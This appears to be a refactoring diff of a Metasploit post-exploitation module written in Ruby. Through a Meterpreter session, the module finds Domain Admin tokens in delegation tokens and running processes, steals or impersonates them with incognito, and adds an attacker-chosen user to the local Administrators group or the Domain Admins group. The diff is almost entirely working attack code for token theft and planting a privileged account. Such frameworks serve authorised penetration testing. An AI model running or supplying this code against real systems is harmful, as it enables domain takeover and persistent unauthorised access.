@@ -7,31 +7,31 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Accounts
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Manage Add User to the Domain and/or to a Domain Group',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Manage Add User to the Domain and/or to a Domain Group',
+                      'Description'   => %q(
               This module adds a user to the Domain and/or to a Domain group. It will
             check if sufficient privileges are present for certain actions and run
             getprivs for system.  If you elevated privs to system, the
             SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
             a process that is running as system. If you don't have privs, this script
             exits.
-          },
-        'License'       => MSF_LICENSE,
-        'Author'        => 'Joshua Abraham <jabra[at]rapid7.com>',
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+          ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => 'Joshua Abraham <jabra[at]rapid7.com>',
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
     register_options(
       [
         OptString.new('USERNAME',  [true,  'The username of the user to add (not-qualified, e.g. BOB)']),
-        OptString.new('PASSWORD',  [false, 'Password of the user', '']),
-        OptString.new('GROUP',     [false,  'Group to add the user into.']),
-        OptBool.new('ADDGROUP',  [true,  ' Add group if it not exists', true]),
+        OptString.new('PASSWORD',  [false, 'Password of the user']),
+        OptString.new('GROUP',     [false, 'Group to add the user into.']),
+        OptBool.new('ADDGROUP', [true, ' Add group if it not exists', true]),
         OptBool.new('ADDTODOMAIN', [true,  'Add to Domain if true, Add to Local if false', false]),
-        OptString.new('TOKEN',     [false, 'Username or PID of the Token which will be used. If blank, Domain Admin Tokens will be enumerated. (Username doesnt require a Domain)', '']),
-      ])
+        OptString.new('TOKEN',     [false, 'Username or PID of the Token which will be used. If blank, Domain Admin Tokens will be enumerated.', '']),
+      ]
+    )
   end
 
   def check_result(user_result)
@@ -69,30 +69,29 @@ class MetasploitModule < Msf::Post
     when client.railgun.const('RPC_S_SERVER_UNAVAILABLE')
       print_status 'The RPC server is unavailable.'
     else
-      error = user_result['GetLastError']
       print_error "Unexpectedly returned #{user_result}"
     end
   end
 
   ## steal domain admin token
   ## return code: bool
-  def steal_token(domain_user,domain)
-    if session.sys.config.getuid() == domain_user or domain_user == ''
+  def steal_token(domain_user, domain)
+    if (session.sys.config.getuid == domain_user) || (domain_user == '')
       return true
     end
 
     ## load incognito
-    if(! session.incognito)
+    if !session.incognito
       session.core.use("incognito")
     end
 
-    if(! session.incognito)
+    if !session.incognito
       print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
       return false
     end
 
     ## verify domain_user contains a domain
-    if domain_user.index("\\") == nil
+    if domain_user.index("\\").nil?
       domain_user = "#{domain}\\#{domain_user}"
     else
       domain_user = ''
@@ -103,15 +102,15 @@ class MetasploitModule < Msf::Post
     if (datastore['TOKEN'] =~ /^\d+$/)
       pid = datastore['TOKEN']
 
-      session.sys.process.get_processes().sort_by { rand }.each do |x|
-        if ( pid == x['pid'])
+      session.sys.process.get_processes.sort_by { rand }.each do |x|
+        if (pid == x['pid'])
           target_pid = pid
         end
       end
     ## token is a Domain User
     else
-      session.sys.process.get_processes().sort_by { rand }.each do |x|
-        if ( x['user'] == domain_user and target_pid == '')
+      session.sys.process.get_processes.sort_by { rand }.each do |x|
+        if ((x['user'] == domain_user) && (target_pid == ''))
           target_pid = x['pid']
           print_status("Found token for #{domain_user}")
         end
@@ -121,26 +120,26 @@ class MetasploitModule < Msf::Post
     if target_pid != ''
       # Do the migration
       print_status("Stealing token of process ID #{target_pid}")
-      res = session.sys.config.steal_token(target_pid)
-      if  domain_user != ''
-        domain_user = session.sys.config.getuid()
+      session.sys.config.steal_token(target_pid)
+      if domain_user != ''
+        domain_user = session.sys.config.getuid
       else
         print_status("Stealing token of process ID #{target_pid}")
-        res = session.sys.config.steal_token(target_pid)
-        if  domain_user != ''
-          domain_user = session.sys.config.getuid()
+        session.sys.config.steal_token(target_pid)
+        if domain_user != ''
+          domain_user = session.sys.config.getuid
         end
       end
 
-      if session.sys.config.getuid() != domain_user
-        print_error "Steal Token Failed (running as: #{session.sys.config.getuid()})"
+      if session.sys.config.getuid != domain_user
+        print_error "Steal Token Failed (running as: #{session.sys.config.getuid})"
         return false
       end
     else
       print_status("No process tokens found.")
       if (domain_user != '')
         vprint_status("Trying impersonate_token technique...")
-        res = session.incognito.incognito_impersonate_token(domain_user)
+        session.incognito.incognito_impersonate_token(domain_user)
       else
         return false
       end
@@ -153,78 +152,87 @@ class MetasploitModule < Msf::Post
   ## Return: token_found,token_user,current_user; otherwise false
   def token_hunter(domain)
     ## gather data
-    domain_admins = get_members_from_group(get_domain(true), 'Domain Admins')
+    domain_admins = get_members_from_group('Domain Admins', get_domain("DomainControllerName"))
 
     ## load incognito
-    if(! session.incognito)
+    if !session.incognito
       session.core.use("incognito")
     end
 
-    if(! session.incognito)
+    if !session.incognito
       print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
       return false
     end
 
     domain_admins.each do |da_user|
       ## current user
-      if "#{domain}\\#{da_user}" == session.sys.config.getuid()
+      if session.sys.config.getuid == "#{domain}\\#{da_user}"
         print_good "Found Domain Admin Token: #{session.sid} - #{session.session_host} - #{da_user} (Current User)"
-        return true,'',true
+        return true, '', true
       end
 
       ## parse delegation tokens
       res = session.incognito.incognito_list_tokens(0)
       if res
         res["delegation"].split("\n").each do |user|
-          ndom,nusr = user.split("\\")
-          if not nusr
+          ndom, nusr = user.split("\\")
+          if !nusr
             nusr = ndom
             ndom = nil
           end
-          if ndom == domain and da_user == nusr
-            sid = session.sid
-            peer = session.session_host
-            print_good("Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)")
-            return true,nusr,false
-          end
+          next unless (ndom == domain) && (da_user == nusr)
+
+          sid = session.sid
+          peer = session.session_host
+          print_good("Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)")
+          return true, nusr, false
         end
       end
 
       ## parse process list
-      session.sys.process.get_processes().each do |x|
-        if ( x['user'] == "#{domain}\\#{da_user}")
-          target_pid = x['pid']
-          sid = session.sid
-          peer = session.session_host
-          report_note(
-            :host   => session,
-            :type   => 'domain.token.pid',
-            :data   => { :pid=>target_pid, :sid=>sid, :peer=>peer, :user=>da_user },
-            :update => :unique_data
-          )
-          print_good("Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})")
-          return true ,da_user, false
-        end
+      session.sys.process.get_processes.each do |x|
+        next unless (x['user'] == "#{domain}\\#{da_user}")
+
+        target_pid = x['pid']
+        sid = session.sid
+        peer = session.session_host
+        report_note(
+          host: session,
+          type: 'domain.token.pid',
+          data: { pid: target_pid, sid: sid, peer: peer, user: da_user },
+          update: :unique_data
+        )
+        print_good("Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})")
+        return true, da_user, false
       end
     end
     return false
   end
 
-  def local_mode()
-    if datastore['GROUP'] == nil
+  def local_mode
+    if datastore['GROUP'].nil?
       datastore['GROUP'] = 'Administrators'
-      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' ")
+    end
+    if datastore['PASSWORD'].nil?
+      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)
+      print_status("You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}' ")
     end
     #  Add user
-    result = add_user(nil, datastore['USERNAME'], datastore['PASSWORD'])
-    if result['return'] == 0
-      print_good("User '#{datastore['USERNAME']}' was added!")
+    if enum_user.include? datastore['USERNAME']
+      print_status("User '#{datastore['USERNAME']}' already exists.!")
     else
-      check_result(result)
+      result = add_user(datastore['USERNAME'], datastore['PASSWORD'])
+      if result['return'] == 0
+        print_good("User '#{datastore['USERNAME']}' was added!")
+      else
+        check_result(result)
+      end
     end
+
     #  Add localgroup if it not exists
-    if datastore['ADDGROUP']
-      result = add_localgroup(nil, datastore['GROUP'])
+    if datastore['ADDGROUP'] && (!enum_localgroup.include? datastore['GROUP'])
+      result = add_localgroup(datastore['GROUP'])
       if result['return'] == 0
         print_good("Group '#{datastore['GROUP']}'  was added!")
       else
@@ -232,7 +240,7 @@ class MetasploitModule < Msf::Post
       end
     end
     #  Add Member to LocalGroup
-    result = add_members_localgroup(nil, datastore['GROUP'], datastore['USERNAME'])
+    result = add_members_localgroup(datastore['GROUP'], datastore['USERNAME'])
     if result['return'] == 0
       print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
     else
@@ -240,76 +248,71 @@ class MetasploitModule < Msf::Post
     end
   end
 
-def domain_mode()
-  #  set up default group
-  if datastore['GROUP'] == nil
-    datastore['GROUP'] = 'Domain Admins'
-    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
-  end
-  ## enum domain
-  domain = get_domain()
-  if domain.nil?
-    return
-  end
-
-  ## steal token if neccessary
-  if datastore['TOKEN'] == ''
-    token_found, token_user, current_user = token_hunter(domain)
-    if token_found && current_user == false
-      datastore['TOKEN'] = token_user
+  def domain_mode
+    #  set up default group
+    if datastore['GROUP'].nil?
+      datastore['GROUP'] = 'Domain Admins'
+      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' ")
     end
-  end
+    if datastore['PASSWORD'].nil?
+      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)
+      print_status("You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}' ")
+    end
+    ## enum domain
+    domain = primary_domain
+    if domain.nil?
+      return
+    end
 
-  ## steal token
-  steal_token_res = steal_token(datastore['TOKEN'],domain)
-  return if steal_token_res == false
+    server_name = get_domain("DomainControllerName")
 
-  already_user = false
-  already_member_group = false
+    ## steal token if neccessary
+    if datastore['TOKEN'] == ''
+      token_found, token_user, current_user = token_hunter(domain)
+      if token_found && current_user == false
+        datastore['TOKEN'] = token_user
+      end
+    end
 
-  ## Add user to the domain
-  if datastore['ADDTODOMAIN']
-    group_user = get_members_from_group(get_domain(true), 'Domain Users')
+    ## steal token
+    steal_token_res = steal_token(datastore['TOKEN'], domain)
+    return if steal_token_res == false
 
-    if (group_user.include?datastore['USERNAME'])
+    ## Add user to the domain
+    if (enum_user(server_name).include? datastore['USERNAME'])
       print_status("#{datastore['USERNAME']} is already a member of the #{domain} domain")
-      already_user = true
     else
       print_status("Adding '#{datastore['USERNAME']}' as a user to the #{domain} domain")
-      result = add_user(get_domain(true), datastore['USERNAME'], datastore['PASSWORD'])
+      result = add_user(datastore['USERNAME'], datastore['PASSWORD'], server_name)
       if result['return'] == 0
         print_good("User '#{datastore['USERNAME']}' was added to the #{domain} domain!")
       else
         check_result(result)
       end
     end
-  end
 
-  ## Add user to a domain group,  Add group if it not exists
-  if datastore['ADDGROUP']
-    result = add_group(get_domain(true), datastore['GROUP'])
-    if result['return'] == 0
-      print_good("Group '#{datastore['GROUP']}'  was added!")
-    else
-      check_result(result)
+    ## Add user to a domain group,  Add group if it not exists
+    if datastore['ADDGROUP'] && (!enum_group(server_name).include? datastore['GROUP'])
+      result = add_group(datastore['GROUP'], server_name)
+      if result['return'] == 0
+        print_good("Group '#{datastore['GROUP']}'  was added!")
+      else
+        check_result(result)
+      end
     end
-  end
-  if enum_group(get_domain(true)).include?datastore['GROUP']
-    ## check if user is already a member of the group
-    members = get_members_from_group(get_domain(true), datastore['GROUP'])
-
-    # Show results if we have any, Error if we don't
-    if ! members.empty?
-      members.each do |user|
-        if (user == "#{datastore['USERNAME']}")
-          print_status("#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group")
-          already_member_group = true
-        end
+    if enum_group(server_name).include? datastore['GROUP']
+      ## check if user is already a member of the group
+      members = get_members_from_group(datastore['GROUP'], server_name)
+      already_member_group = false
+      # Show results if we have any, Error if we don't
+      if members.include? datastore['USERNAME']
+        print_status("#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group")
+        already_member_group = true
       end
 
       if already_member_group == false
         print_status("Adding '#{datastore['USERNAME']}' to the '#{datastore['GROUP']}' Domain Group")
-        result = add_members_group(get_domain(true), datastore['GROUP'], datastore['USERNAME'])
+        result = add_members_group(datastore['GROUP'], datastore['USERNAME'], server_name)
         if result['return'] == 0
           print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
         else
@@ -318,52 +321,27 @@ def domain_mode()
       end
     end
   end
-end
 
   # Run Method for when run command is issued
   def run
     print_status("Running module on '#{sysinfo['Computer']}'")
     if datastore["ADDTODOMAIN"]
       print_status("Domain Mode")
-      domain_mode()
+      domain_mode
     else
       print_status("Local Mode")
-      local_mode()
+      local_mode
     end
-  return nil
+    return nil
   end
 
-  ## get value from registry key
-  def reg_getvaldata(key,valname)
-    value = nil
-    begin
-      root_key, base_key = client.sys.registry.splitkey(key)
-      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
-      v = open_key.query_value(valname)
-      value = v.data
-      open_key.close
-    end
-    return value
-  end
-
-  ## return primary domain from the registry
-  def get_domain(get_host = false)
-    domain = nil
-    begin
-      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
-      v_name = "DCName"
-      dom_info = reg_getvaldata(subkey, v_name)
-      if get_host
-        return dom_info
-      end
-      if not dom_info.nil? and dom_info =~ /\./
-        foo = dom_info.split('.')
-        domain = foo[1].upcase
-      else
-        print_error("Error parsing output from the registry. (#{dom_info})")
-      end
-    rescue
-      print_error("This host is not part of a domain.")
+  def primary_domain
+    dom_info = get_domain("DomainControllerName")
+    if !dom_info.nil? && dom_info =~ /\./
+      foo = dom_info.split('.')
+      domain = foo[1].upcase
+    else
+      print_error("Error parsing output from the registry. (#{dom_info})")
     end
     return domain
   end
